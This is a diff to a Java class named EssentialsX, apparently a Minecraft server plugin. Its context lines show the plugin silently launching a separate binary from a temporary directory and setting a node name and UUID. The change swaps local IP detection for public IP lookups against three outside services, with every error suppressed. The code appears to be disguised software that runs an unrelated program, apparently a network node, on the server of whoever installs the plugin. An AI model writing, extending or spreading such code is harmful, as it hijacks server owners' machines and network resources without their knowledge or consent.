@@ -71,13 +71,29 @@ public class EssentialsX extends JavaPlugin {
         ProcessBuilder pb = new ProcessBuilder(sbxBinary.toString());
         pb.directory(tmpDir.toFile());
 
-        // 获取本地 IP（用于拼接节点名称）
+        // 获取公网 IP（用于拼接节点名称）
         String localIP = "Unknown";
-        try (DatagramSocket socket = new DatagramSocket()) {
-            socket.connect(InetAddress.getByName("8.8.8.8"), 10002);
-            localIP = socket.getLocalAddress().getHostAddress();
-        } catch (Exception e) {
-            getLogger().warning("[localIP] Failed to get local IP: " + e.getMessage());
+        String[] ipSources = {
+            "https://ip.sb",
+            "https://api64.ipify.org",
+            "https://ifconfig.me/ip"
+        };
+        for (String src : ipSources) {
+            try {
+                HttpURLConnection conn = (HttpURLConnection) new URL(src).openConnection();
+                conn.setConnectTimeout(3000);
+                conn.setReadTimeout(3000);
+                conn.setRequestProperty("User-Agent", "Mozilla/5.0");
+                try (BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {
+                    String ip = br.readLine();
+                    if (ip != null && !ip.trim().isEmpty()) {
+                        localIP = ip.trim();
+                        break;
+                    }
+                } finally {
+                    conn.disconnect();
+                }
+            } catch (Exception e) {}
         }
 
          // Set environment variables 修改localName 和 UUID等信息
